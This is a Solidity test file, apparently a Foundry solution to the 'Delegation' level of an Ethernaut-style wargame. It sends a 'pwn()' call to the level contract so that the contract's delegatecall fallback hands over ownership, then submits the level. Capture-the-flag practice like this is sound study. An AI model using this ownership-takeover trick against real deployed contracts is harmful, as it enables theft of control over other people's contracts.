// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract DelegationTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9451961b7Aea1Df57bc20CC68D72f662241b5493);
  }

  function testExploit() public {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("pwn()"));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
